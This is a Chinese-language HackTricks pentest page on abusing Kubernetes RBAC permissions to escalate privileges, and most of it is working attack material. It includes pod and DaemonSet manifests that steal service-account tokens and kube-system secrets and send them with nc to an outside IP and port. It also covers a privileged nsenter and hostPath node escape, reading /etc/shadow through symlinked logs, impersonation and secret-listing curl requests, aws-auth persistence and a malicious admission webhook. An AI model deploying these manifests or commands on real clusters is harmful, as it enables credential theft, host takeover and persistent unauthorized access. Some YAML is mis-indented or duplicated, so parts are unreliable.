# 在Kubernetes中滥用角色/集群角色

<details>

<summary><strong>支持HackTricks并获得福利！</strong></summary>

* 如果您想在HackTricks中看到您的公司广告，或者如果您想访问PEASS的最新版本或下载PDF格式的HackTricks，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFT**](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我的 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) **和** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github仓库提交PR来分享您的黑客技巧。**

</details>

在这里，您可以找到一些潜在危险的角色和集群角色配置。\
请记住，您可以使用`kubectl api-resources`获取所有支持的资源。

## **特权升级**

在Kubernetes中，特权升级是指以比您已有的权限更高的权限（在Kubernetes集群内部或外部云中）获得对不同主体的访问权限。在Kubernetes中，基本上有**4种主要的特权升级技术**：

* 能够以更高权限冒充其他用户/组/服务账户（SAs），在Kubernetes集群内部或外部云中
* 能够创建/修补/执行Pod，您可以在其中找到或附加具有更高权限的服务账户（SAs），在Kubernetes集群内部或外部云中
* 能够读取机密信息，因为服务账户（SAs）的令牌存储为机密
* 能够从容器中逃逸到节点，您可以窃取运行在节点上的所有容器的机密信息、节点的凭据以及节点在云中（如果有的话）的权限
* 值得一提的第五种技术是能够在Pod中运行端口转发，因为您可能能够访问该Pod中的有趣资源。

### **访问任何资源或动词（通配符）**

此权限提供对**任何资源的任何动词**的访问权限。这是用户可以获得的最重要的权限，特别是如果此权限也是“ClusterRole”。如果是“ClusterRole”，则用户可以访问任何命名空间的资源，并拥有该权限控制的集群。
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["*"]
```
### **访问任意资源**

给予用户访问任意资源的权限可能非常危险。但是，哪些动词允许访问这些资源呢？以下是一些危险的RBAC权限，可能会对整个集群造成损害：

- **resources: \["\*"] verbs: \["create"]** - 这个权限可以在集群中创建任何资源，比如pods、roles等。攻击者可能会滥用它来提升权限。关于这个的示例可以在**“Pods创建”部分**找到。
- **resources: \["\*"] verbs: \["list"]** - 列出任何资源的能力可以用来泄露其他用户的秘密，并可能更容易提升权限。关于这个的示例可以在**“列出秘密”部分**找到。
- **resources: \["\*"] verbs: \["get"]** - 这个权限可以用来从其他服务账户获取秘密。
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["create", "list", "get"]
```
### 创建Pod - 窃取令牌

一个拥有在“kube-system”命名空间中创建pod权限的攻击者可以创建加密挖矿容器。此外，如果存在一个拥有特权权限的**服务账户，通过运行一个使用该服务的pod，可以滥用权限来升级特权**。

在这里，我们有一个名为_bootstrap-signer_的默认特权账户，具有列出所有密钥的权限。

![](https://www.cyberark.com/wp-content/uploads/2018/12/rolebinding\_with\_cluster\_admin\_clusterrole-1024x545.png)

攻击者可以创建一个恶意的pod，它将使用特权服务。然后，通过滥用服务令牌，它将窃取密钥：

![](https://www.cyberark.com/wp-content/uploads/2018/12/pods\_yaml\_with\_autoamountServiceAccountToken-1024x345.png)
```yaml
apiVersion: v1
kind: Pod
metadata:
name: alpine
namespace: kube-system
spec:
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
```
在上一个图像中，请注意_bootstrap-signer服务在`serviceAccountname`中的使用。

因此，只需创建恶意的pod并期望在端口6666中获取秘密：

### **创建和逃逸Pod**

以下定义提供了容器可以拥有的所有特权：

* **特权访问**（禁用保护并设置能力）
* **禁用命名空间hostIPC和hostPid**，可以帮助提升特权
* **禁用hostNetwork**命名空间，提供访问窃取节点云特权和更好的网络访问权限
* **挂载主机的/**到容器中

{% code title="super_privs.yaml" %}
```yaml
apiVersion: v1
kind: Pod
metadata:
name: ubuntu
labels:
app: ubuntu
spec:
# Uncomment and specify a specific node you want to debug
# nodeName: <insert-node-name-here>
containers:
- image: ubuntu
command:
- "sleep"
- "3600" # adjust this as needed -- use only as long as you need
imagePullPolicy: IfNotPresent
name: ubuntu
securityContext:
allowPrivilegeEscalation: true
privileged: true
#capabilities:
#  add: ["NET_ADMIN", "SYS_ADMIN"] # add the capabilities you need https://man7.org/linux/man-pages/man7/capabilities.7.html
runAsUser: 0 # run as root (or any other user)
volumeMounts:
- mountPath: /host
name: host-volume
restartPolicy: Never # we want to be intentional about running this pod
hostIPC: true # Use the host's ipc namespace https://www.man7.org/linux/man-pages/man7/ipc_namespaces.7.html
hostNetwork: true # Use the host's network namespace https://www.man7.org/linux/man-pages/man7/network_namespaces.7.html
hostPID: true # Use the host's pid namespace https://man7.org/linux/man-pages/man7/pid_namespaces.7.htmlpe_
volumes:
- name: host-volume
hostPath:
path: /
```
{% endcode %}

使用以下命令创建Pod：
```bash
kubectl --token $token create -f mount_root.yaml
```
来自[这条推文](https://twitter.com/mauilion/status/1129468485480751104)的一句话，加上一些补充：
```bash
kubectl run r00t --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}]}}'
```
现在你已经能够逃离节点，可以在以下页面中查看后渗透技术：

#### 隐蔽性

你可能希望更加**隐蔽**，在接下来的页面中，你可以看到如果你创建一个只启用了之前模板中提到的某些权限的pod，你将能够访问到什么：

* **特权 + hostPID**
* **仅特权**
* **hostPath**
* **hostPID**
* **hostNetwork**
* **hostIPC**

_你可以在_ [_https://github.com/BishopFox/badPods_](https://github.com/BishopFox/badPods) _找到如何创建/滥用之前特权pod配置的示例_

### 创建Pod - 迁移到云端

如果你可以**创建**一个**pod**（可选地创建一个**服务账号**），你可能能够通过将云角色分配给pod或服务账号来在云环境中获得特权，然后访问它。\
此外，如果你可以创建一个**具有主机网络命名空间的pod**，你可以窃取**节点**实例的IAM角色。

了解更多信息，请查看：

{% content-ref url="pod-escape-privileges.md" %}
[pod-escape-privileges.md](pod-escape-privileges.md)
{% endcontent-ref %}

### **创建/修补部署、守护进程集、有状态集、复制控制器、副本集、作业和定时作业**

部署、守护进程集、有状态集、复制控制器、副本集、作业和定时作业都是允许在集群中创建不同任务的特权。此外，可以使用它们中的任何一个来**开发pod甚至创建pod**。因此，可以像之前的示例一样**滥用它们来提升特权**。

假设我们有**创建守护进程集的权限**，我们创建以下YAML文件。此YAML文件配置为执行我们在“创建pod”部分中提到的相同步骤。
```yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
name: alpine
namespace: kube-system
spec:
selector:
matchLabels:
name: alpine
template:
metadata:
labels:
name: alpine
spec:
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
volumeMounts:
- mountPath: /root
name: mount-node-root
volumes:
- name: mount-node-root
hostPath:
path: /
```
在第6行中，您可以找到对象“spec”和第10行中的“**template**”等子对象。这些对象保存了我们希望完成的任务的配置。还要注意第15行的“**serviceAccountName**”和第18行的“**containers**”对象。这部分与创建我们的恶意容器有关。

Kubernetes API文档指出，“**PodTemplateSpec**”端点有创建容器的选项。而且，正如您所看到的：**deployment、daemonsets、statefulsets、replicationcontrollers、replicasets、jobs和cronjobs都可以用来创建pods**：

![](https://www.cyberark.com/wp-content/uploads/2019/08/Kube-Pentest-Fig-8.png)

**因此，创建或更新任务的权限也可以被滥用以进行集群中的权限提升。**

### **Pods Exec**

**`pods/exec`**是kubernetes中用于在pod内部的shell中运行命令的资源。这个权限是为了那些想要**访问容器并运行命令**的管理员而设计的。它就像为容器创建SSH会话一样。

如果我们拥有这个权限，实际上我们就能够**控制所有的pods**。为了做到这一点，我们需要使用以下命令：
```bash
kubectl exec -it <POD_NAME> -n <NAMESPACE> -- sh
```
请注意，由于您可以进入任何 pod，您可以像在**Pod 创建利用**中一样滥用其他 pod 的令牌，以尝试提升权限。

### 端口转发

此权限允许将一个本地端口转发到指定 pod 中的一个端口。这旨在使您能够轻松调试运行在 pod 内部的应用程序，但攻击者可能会滥用此权限来访问 pod 内部的有趣（如数据库）或易受攻击的应用程序（如网页）。
```
kubectl port-forward pod/mypod 5000:5000
```
### **主机可写 /var/log/ 逃逸**

正如[**这项研究**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html)所指出的那样，如果您可以访问或创建一个挂载了**主机`/var/log/`目录**的Pod，您就可以**从容器中逃逸**出来。\
这主要是因为当**Kube-API尝试获取容器的日志**（使用`kubectl logs <pod>`）时，它会使用**Kubelet**服务的`/logs/`端点来请求Pod的`0.log`文件。\
Kubelet服务公开了`/logs/`端点，它基本上只是**公开了容器的`/var/log`文件系统**。

因此，一个具有**写入容器的/var/log/文件夹的权限**的攻击者可以通过以下两种方式滥用这种行为：

* 修改其容器的`0.log`文件（通常位于`/var/logs/pods/namespace_pod_uid/container/0.log`），将其设置为指向`/etc/shadow`的**符号链接**。然后，您就可以执行以下操作来窃取主机的shadow文件：
```bash
kubectl logs escaper
failed to get parse function: unsupported log format: "root::::::::\n"
kubectl logs escaper --tail=2
failed to get parse function: unsupported log format: "systemd-resolve:*:::::::\n"
# Keep incrementing tail to exfiltrate the whole file
```
* 如果攻击者控制任何具有读取 `nodes/log` 权限的主体，他只需在 `/host-mounted/var/log/sym` 中创建一个符号链接指向 `/`，当访问 `https://<gateway>:10250/logs/sym/` 时，他将列出主机的根文件系统（更改符号链接可以提供对文件的访问）。
```bash
curl -k -H 'Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Im[...]' 'https://172.17.0.1:10250/logs/sym/'
<a href="bin">bin</a>
<a href="data/">data/</a>
<a href="dev/">dev/</a>
<a href="etc/">etc/</a>
<a href="home/">home/</a>
<a href="init">init</a>
<a href="lib">lib</a>
[...]
```
**实验室和自动化利用可以在** [**https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts**](https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts) **找到**

#### 绕过只读保护 <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

如果你足够幸运，并且高权限的 `CAP_SYS_ADMIN` 功能可用，你可以将文件夹重新挂载为读写模式：
```bash
mount -o rw,remount /hostlogs/
```
#### 绕过 hostPath 的只读保护 <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

正如[**这项研究**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html)所述，可以绕过这种保护措施：
```yaml
allowedHostPaths:
- pathPrefix: "/foo"
readOnly: true
```
这个方法旨在防止像之前那样的逃逸，而是使用PersistentVolume和PersistentVolumeClaim来挂载容器中具有可写访问权限的主机文件夹，而不是使用hostPath挂载。
```yaml
apiVersion: v1
kind: PersistentVolume
metadata:
name: task-pv-volume-vol
labels:
type: local
spec:
storageClassName: manual
capacity:
storage: 10Gi
accessModes:
- ReadWriteOnce
hostPath:
path: "/var/log"
---
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
name: task-pv-claim-vol
spec:
storageClassName: manual
accessModes:
- ReadWriteOnce
resources:
requests:
storage: 3Gi
---
apiVersion: v1
kind: Pod
metadata:
name: task-pv-pod
spec:
volumes:
- name: task-pv-storage-vol
persistentVolumeClaim:
claimName: task-pv-claim-vol
containers:
- name: task-pv-container
image: ubuntu:latest
command: [ "sh", "-c", "sleep 1h" ]
volumeMounts:
- mountPath: "/hostlogs"
name: task-pv-storage-vol
```
### **冒充特权账户**

通过[**用户冒充**](https://kubernetes.io/docs/reference/access-authn-authz/authentication/#user-impersonation)权限，攻击者可以冒充特权账户。

在这个例子中，服务账户 _**sa-imper**_ 与一个具有允许冒充组和用户的规则的 ClusterRole 绑定。

![](https://www.cyberark.com/wp-content/uploads/2018/12/clusterRole\_for\_user\_impersonation.png)

![](https://www.cyberark.com/wp-content/uploads/2018/12/clusterRole\_for\_user\_impersonation\_2.png)

可以使用 `--as=null --as-group=system:master` 属性来**列出所有的密钥**：

![](https://www.cyberark.com/wp-content/uploads/2018/12/listing\_secrets\_with\_and\_without\_user\_impersonation-1024x108.png)

**也可以通过 API REST 端点执行相同的操作：**
```bash
curl -k -v -XGET -H "Authorization: Bearer <JWT TOKEN (of the impersonator)>" \
-H "Impersonate-Group: system:masters"\
-H "Impersonate-User: null" \
-H "Accept: application/json" \
https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
### **列出秘密**

**列出秘密的权限**是集群中非常强大的能力。拥有列出秘密的权限的用户可以**潜在地查看集群中的所有秘密 - 包括管理员密钥**。秘密密钥是以base64编码的JWT令牌。

![](https://www.cyberark.com/wp-content/uploads/2018/12/listing\_secrets\_role.png)

攻击者如果在集群中获得了**访问\_list secrets**\_的权限，可以使用以下_curl_命令获取“kube-system”命名空间中的所有秘密：
```bash
curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
![](https://www.cyberark.com/wp-content/uploads/2019/08/Kube-Pentest-Fig-2.png)

### **读取秘密 - 暴力破解令牌ID**

找到具有读取秘密权限的令牌的攻击者在不知道完整秘密名称的情况下无法使用此权限。这个权限与上面描述的_**列出**_ _**秘密**_权限不同。

![](https://www.cyberark.com/wp-content/uploads/2018/12/getting\_secret\_clusterRole.png)

![](https://www.cyberark.com/wp-content/uploads/2018/12/clusterRoleBinding\_with\_get\_secrets\_clusterRole.png)

尽管攻击者不知道秘密的名称，但可以列出默认的服务帐户。

![](https://www.cyberark.com/wp-content/uploads/2018/12/default\_service\_accounts\_list.png)

每个服务帐户都有一个关联的秘密，其中包含一个静态（不变）前缀和一个随机的五字符字符串令牌后缀。

![](https://www.cyberark.com/wp-content/uploads/2018/12/default\_service\_account\_on\_kube\_system\_namespace-1024x556.png)

随机令牌结构是由字母数字字符（小写字母和数字）构成的5字符字符串。**但它不包含所有字母和数字。**

查看[源代码](https://github.com/kubernetes/kubernetes/blob/8418cccaf6a7307479f1dfeafb0d2823c1c37802/staging/src/k8s.io/apimachinery/pkg/util/rand/rand.go#L83)时，可以看到令牌仅由27个字符“bcdfghjklmnpqrstvwxz2456789”生成，而不是36个（a-z和0-9）。

![](https://www.cyberark.com/wp-content/uploads/2018/12/character\_set\_from\_rand\_go.png)

![](https://www.cyberark.com/wp-content/uploads/2018/12/comments\_on\_removing\_characters\_rand\_go\_character\_set-1024x138.png)

这意味着令牌有14,348,907种可能性。

攻击者可以运行暴力破解攻击来猜测令牌ID，大约需要几个小时的时间。成功从默认敏感服务帐户获取秘密将允许攻击者提升权限。

### 证书签名请求

如果在资源`certificatesigningrequests`（或至少在`certificatesigningrequests/nodeClient`）中具有动词**`create`**，则可以**创建**一个新的节点的CeSR。

根据[文档，可以自动批准这些请求](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet-tls-bootstrapping/)，因此在这种情况下**不需要额外的权限**。如果不能自动批准请求，则需要能够批准请求，这意味着在`certificatesigningrequests/approval`和`signers`中使用资源名称`<signerNameDomain>/<signerNamePath>`或`<signerNameDomain>/*`进行更新和批准。

一个具有所有所需权限的**角色示例**如下：
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: csr-approver
rules:
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests
verbs:
- get
- list
- watch
- create
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests/approval
verbs:
- update
- apiGroups:
- certificates.k8s.io
resources:
- signers
resourceNames:
- example.com/my-signer-name # example.com/* can be used to authorize for all signers in the 'example.com' domain
verbs:
- approve
```
所以，通过批准新的节点CSR，您可以滥用节点的特殊权限来窃取机密信息并提升权限。

在[**这篇文章**](https://www.4armed.com/blog/hacking-kubelet-on-gke/)和[**这篇文章**](https://rhinosecuritylabs.com/cloud-security/kubelet-tls-bootstrap-privilege-escalation/)中，GKE K8s TLS引导配置被配置为**自动签名**，并被滥用以生成新的K8s节点的凭据，然后通过窃取机密信息来提升权限。\
如果您**拥有上述权限，您也可以做同样的事情**。请注意，第一个示例绕过了阻止新节点访问容器内部机密信息的错误，因为**节点只能访问挂载在其上的容器的机密信息**。

绕过此限制的方法只是**为挂载有有趣机密信息的容器所在的节点名称创建节点凭据**（但请参考第一篇文章中的操作方法）：
```bash
"/O=system:nodes/CN=system:node:gke-cluster19-default-pool-6c73b1-8cj1"
```
### AWS EKS aws-auth configmaps

在 EKS（需要在 AWS 中）集群上，可以修改 kube-system 命名空间中的 **`configmaps`** 的主体可以通过覆盖 **aws-auth** configmap 来获得集群管理员权限。
所需的动词是 **`update`** 和 **`patch`**，或者如果 configmap 尚未创建，则是 **`create`**：

{% code overflow="wrap" %}
```bash
# Check if config map exists
get configmap aws-auth -n kube-system -o yaml

## Yaml example
apiVersion: v1
kind: ConfigMap
metadata:
name: aws-auth
namespace: kube-system
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters

# Create donfig map is doesn't exist
## Using kubectl and the previous yaml
kubectl apply -f /tmp/aws-auth.yaml
## Using eksctl
eksctl create iamidentitymapping --cluster Testing --region us-east-1 --arn arn:aws:iam::123456789098:role/SomeRoleTestName --group "system:masters" --no-duplicate-arns

# Modify it
kubectl edit -n kube-system configmap/aws-auth
## You can modify it to even give access to users from other accounts
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters
mapUsers: |
- userarn: arn:aws:iam::098765432123:user/SomeUserTestName
username: admin
groups:
- system:masters
```
{% endcode %}

{% hint style="warning" %}
您可以使用 **`aws-auth`** 进行 **持久性**，从而使用户可以从 **其他账户** 访问。

但是，`aws --profile other_account eks update-kubeconfig --name <cluster-name>` **无法从不同的账户** 进行操作。但实际上，如果您将集群的 ARN 放在名称之前，`aws --profile other_account eks get-token --cluster-name arn:aws:eks:us-east-1:123456789098:cluster/Testing` 就可以工作。\
要使 `kubectl` 工作，只需确保 **配置受害者的 kubeconfig**，并在 aws exec args 中添加 `--profile other_account_role`，这样 kubectl 将使用其他账户配置文件获取令牌并与 AWS 进行通信。
{% endhint %}

### 在 GKE 中升级权限

有**两种方法**可以将 K8s 权限分配给 GCP 主体。在任何情况下，主体还需要具有权限 **`container.clusters.get`**，以便能够收集访问集群的凭据，否则您将需要**生成自己的 kubectl 配置文件**（请参阅下面的链接）。

{% hint style="warning" %}
在与 K8s API 端点通信时，将发送 GCP 身份验证令牌。然后，GCP 通过 K8s API 端点首先检查主体（通过电子邮件）是否在集群内具有任何访问权限，然后再检查是否通过 GCP IAM 具有任何访问权限。\
如果其中**任何一个**为**true**，则会**响应**。如果**不是**，则会给出一个错误，建议通过 GCP IAM 授予权限。
{% endhint %}

然后，第一种方法是使用 **GCP IAM**，K8s 权限具有其**等效的 GCP IAM 权限**，如果主体具有这些权限，则可以使用它们。

{% content-ref url="../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md" %}
[gcp-container-privesc.md](../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md)
{% endcontent-ref %}

第二种方法是将 K8s 权限分配给通过其**电子邮件**进行标识的用户（包括 GCP 服务帐户）。

### 创建 serviceaccounts token

可以**创建 TokenRequests**（`serviceaccounts/token`）的主体可以为具有管理员权限的 SAs 发行令牌（来自[**此处**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/token\_request.rego)的信息）。

### ephemeralcontainers

可以**`update`** 或 **`patch`** **`pods/ephemeralcontainers`** 的主体可以在其他 pod 上获得**代码执行**的权限，并且可能通过添加具有特权 securityContext 的临时容器来**突破**到其节点。

### ValidatingWebhookConfigurations 或 MutatingWebhookConfigurations

具有 `validatingwebhookconfigurations` 或 `mutatingwebhookconfigurations` 上的任何一个动词 `create`、`update` 或 `patch` 的主体可能能够**创建此类 webhookconfigurations**，以便能够**升级权限**。

有关 [`mutatingwebhookconfigurations` 示例，请查看此帖子的此部分](./#malicious-admission-controller)。

### 升级

正如您在下一节中所读到的：[**内置的特权升级预防**](./#built-in-privileged-escalation-prevention)，主体无法在没有自己具备这些新权限的情况下更新或创建角色或集群角色。除非他在 **`roles`** 或 **`clusterroles`** 上具有 **`escalate`** 动词。\
然后，他可以更新/创建具有比他自己权限更高的新角色和集群角色。

### 节点代理

具有访问 **`nodes/proxy`** 子资源的主体可以通过 Kubelet API 在 pod 上执行代码（根据[**此处**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/nodes\_proxy.rego)）。有关 Kubelet 身份验证的更多信息，请参阅此页面：

{% content-ref url="../../kubernetes-pentesting/pentesting-kubernetes-services/kubelet-authentication-and-authorization.md" %}
[kubelet-authentication-and-authorization.md](../../kubernetes-pentesting/pentesting-kubernetes-services/kubelet-authentication-and-authorization.md)
{% endcontent-ref %}

您可以在此处找到如何通过授权与 Kubelet API 进行通信的示例：[**在此处获取 RCE 的示例**](../pentesting-kubernetes-services.md#kubelet-rce)。

### 删除 pods + 不可调度的节点

可以**删除 pods**（对 `pods` 资源的 `delete` 动词），或**驱逐 pods**（对 `pods/eviction` 资源的 `create` 动词），或**更改 pod 状态**（访问 `pods/status`），并且可以**使其他节点不可调度**（访问 `nodes/status`），或**删除节点**（对 `nodes` 资源的 `delete` 动词）并且对 pod 具有控制权的主体，可以**窃取其他节点上的 pods**，以便在**受损的节点**上**执行**它们，并且攻击者可以从这些 pods 中**窃取令牌**。
```bash
patch_node_capacity(){
curl -s -X PATCH 127.0.0.1:8001/api/v1/nodes/$1/status -H "Content-Type: json-patch+json" -d '[{"op": "replace", "path":"/status/allocatable/pods", "value": "0"}]'
}

while true; do patch_node_capacity <id_other_node>; done &
#Launch previous line with all the nodes you need to attack

kubectl delete pods -n kube-system <privileged_pod_name>
```
{% endcode %}

### 服务状态 (CVE-2020-8554)

可以**修改** **`services/status`** 的主体可以将 `status.loadBalancer.ingress.ip` 字段设置为利用未修复的 CVE-2020-8554 并对集群发起中间人攻击。大多数针对 CVE-2020-8554 的缓解措施只能防止 ExternalIP 服务 (根据 [**这里**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/modify\_service\_status\_cve\_2020\_8554.rego))。

### 节点和 Pod 状态

具有 **`update`** 或 **`patch`** 权限的主体可以修改标签以影响强制执行的调度约束。

## 内置特权升级预防

尽管可能存在风险的权限，Kubernetes 在防止其他类型的权限特权升级方面做得很好。

Kubernetes 有一个[内置机制](https://kubernetes.io/docs/reference/access-authn-authz/rbac/#privilege-escalation-prevention-and-bootstrapping)来实现这一点：

> RBAC API 通过编辑角色或角色绑定来**防止用户提升权限**。因为这是在 API 级别强制执行的，所以即使 RBAC 授权器未使用，它也适用。
>
> 用户只能在他们已经具有与角色相同范围的所有权限的情况下，才能**创建/更新角色**（对于 ClusterRole 来说是集群范围，对于 Role 来说是相同的命名空间或集群范围）

{% hint style="warning" %}
上述规则有一个例外。如果主体对 **`roles`** 或 **`clusterroles`** 有 **`escalate`** 动词权限，即使没有自己的权限，也可以增加角色和集群角色的权限。
{% endhint %}

让我们看一个此类预防的示例。

名为 _sa7_ 的服务账户位于 RoleBinding _edit-role-rolebinding_ 中。该 RoleBinding 对象具有名为 _edit-role_ 的角色，该角色在 _default_ 命名空间中具有**完全权限规则**。理论上，这意味着该服务账户可以**编辑** _default_ 命名空间中的**任何角色**。

![](https://www.cyberark.com/wp-content/uploads/2018/12/edit\_roles\_roleBinding\_binding\_sa7\_to\_edit\_role.png)

![](https://www.cyberark.com/wp-content/uploads/2018/12/role\_to\_edit\_any\_role.png)

还有一个名为 _list-pods_ 的现有角色。拥有此角色的任何人都可以列出 _default_ 命名空间中的所有 Pod。用户 _sa7_ 应该具有编辑任何角色的权限，因此让我们看看当它尝试将 "secrets" 资源添加到角色的资源时会发生什么。

![](https://www.cyberark.com/wp-content/uploads/2018/12/edit\_role\_resources-300x66.png)

在尝试这样做后，我们将收到一个错误消息 "forbidden: attempt to grant extra privileges"（图 31），因为尽管我们的 _sa7_ 用户具有更新任何资源的角色的权限，但它只能更新它具有权限的资源的角色。

![](https://www.cyberark.com/wp-content/uploads/2018/12/forbidden\_attempt\_to\_gran\_extra\_privileges\_message-1024x288.png)

### **获取和修改 RoleBindings/ClusterRoleBindings**

{% hint style="danger" %}
**显然，这个技术以前是有效的，但根据我的测试，由于前面部分解释的相同原因，它现在不再有效。如果没有权限，你不能创建/修改一个 rolebinding 来给自己或其他服务账户授予一些权限。**
{% endhint %}

拥有创建 Rolebindings 的权限允许用户**将角色绑定到服务账户**。这个权限可能导致权限升级，因为它**允许用户将管理员权限绑定到被入侵的服务账户**。

以下 ClusterRole 使用了特殊的动词 _bind_，允许用户创建一个具有 _admin_ ClusterRole（默认高权限角色）的 RoleBinding，并将任何用户（包括自己）添加到此管理员 ClusterRole 中。

![](https://www.cyberark.com/wp-content/uploads/2018/12/clusterRole\_with\_bind\_verb.png)

然后可以创建 **`malicious-RoleBinging.json`**，将管理员角色绑定到其他被入侵的服务账户：
```javascript
{
"apiVersion": "rbac.authorization.k8s.io/v1",
"kind": "RoleBinding",
"metadata": {
"name": "malicious-rolebinding",
"namespaces": "default"
},
"roleRef": {
"apiGroup": "*",
"kind": "ClusterRole",
"name": "admin"
},
"subjects": [
{
"kind": "ServiceAccount",
"name": "compromised-svc"
"namespace": "default"
}
]
}
```
这个JSON文件的目的是将管理员“ClusterRole”（第11行）绑定到被攻陷的服务账户（第16行）。

现在，我们只需要使用以下CURL命令将我们的JSON作为POST请求发送到API即可：
```bash
curl -k -v -X POST -H "Authorization: Bearer <JWT TOKEN>" \
-H "Content-Type: application/json" \
https://<master_ip>:<port>/apis/rbac.authorization.k8s.io/v1/namespaces/default/rolebindings \
-d @malicious-RoleBinging.json
```
在将**admin角色绑定到“compromised-svc”服务账户**之后，我们可以使用被入侵的服务账户令牌来**列出秘密信息**。以下CURL命令可以实现此功能：
```bash
curl -k -v -X POST -H "Authorization: Bearer <COMPROMISED JWT TOKEN>"\
-H "Content-Type: application/json"
https://<master_ip>:<port>/api/v1/namespaces/kube-system/secret
```
## 其他攻击

### 旁路代理应用

默认情况下，Pod之间的通信没有任何加密。双向认证，Pod对Pod。

#### 创建旁路代理应用 <a href="#create-a-sidecar-proxy-app" id="create-a-sidecar-proxy-app"></a>

创建你的 .yaml 文件
```bash
kubectl run app --image=bash --command -oyaml --dry-run=client > <appName.yaml> -- sh -c 'ping google.com'
```
编辑您的 .yaml 文件并取消注释以下行：
```yaml
#apiVersion: v1
#kind: Pod
#metadata:
#  name: security-context-demo
#spec:
#  securityContext:
#    runAsUser: 1000
#    runAsGroup: 3000
#    fsGroup: 2000
#  volumes:
#  - name: sec-ctx-vol
#    emptyDir: {}
#  containers:
#  - name: sec-ctx-demo
#    image: busybox
command: [ "sh", "-c", "apt update && apt install iptables -y && iptables -L && sleep 1h" ]
securityContext:
capabilities:
add: ["NET_ADMIN"]
#   volumeMounts:
#   - name: sec-ctx-vol
#     mountPath: /data/demo
#   securityContext:
#     allowPrivilegeEscalation: true
```
查看代理的日志：
```bash
kubectl logs app -C proxy
```
更多信息请参考：[https://kubernetes.io/docs/tasks/configure-pod-container/security-context/](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)

### 恶意准入控制器

准入控制器是一段代码，它在对象持久化之前，但在请求经过身份验证和授权之后，拦截对Kubernetes API服务器的请求。

如果攻击者成功注入一个变异准入控制器，他将能够修改已经经过身份验证的请求。这可能导致特权升级，并且通常会在集群中持久存在。

示例来自[https://blog.rewanthtammana.com/creating-malicious-admission-controllers](https://blog.rewanthtammana.com/creating-malicious-admission-controllers)：
```bash
git clone https://github.com/rewanthtammana/malicious-admission-controller-webhook-demo
cd malicious-admission-controller-webhook-demo
./deploy.sh
kubectl get po -n webhook-demo -w
```
等待 Webhook 服务器准备就绪。检查状态：
```bash
kubectl get mutatingwebhookconfigurations
kubectl get deploy,svc -n webhook-demo
```
![mutating-webhook-status-check.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433436353/yHUvUWugR.png?auto=compress,format\&format=webp)

一旦我们的恶意变异 Webhook 运行起来，让我们部署一个新的 Pod。
```bash
kubectl run nginx --image nginx
kubectl get po -w
```
等待一段时间，直到您看到Pod状态发生变化。现在，您可以看到`ErrImagePull`错误。使用以下任一查询检查图像名称。
```bash
kubectl get po nginx -o=jsonpath='{.spec.containers[].image}{"\n"}'
kubectl describe po nginx | grep "Image: "
```
![malicious-admission-controller.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433512073/leFXtgSzm.png?auto=compress,format\&format=webp)

